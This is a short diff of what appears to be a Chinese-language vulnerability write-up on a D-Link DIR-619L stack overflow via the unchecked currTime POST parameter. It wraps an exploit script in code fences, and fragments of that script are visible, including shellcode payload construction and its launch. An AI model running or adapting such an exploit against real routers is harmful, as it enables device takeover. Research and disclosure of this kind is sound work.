@@ -28,7 +28,7 @@ Post参数currTime长度未经校验使用sprintf写入栈上。并在之后webs
  
 
 DIR-619l.py
-
+``` python
 import requests
 import sys
 import struct
@@ -92,3 +92,4 @@ payload1+='a'*0x20+shellcode
 if __name__ == "__main__":
 	syscmd1(payload1)	
 	inter()
+``` 
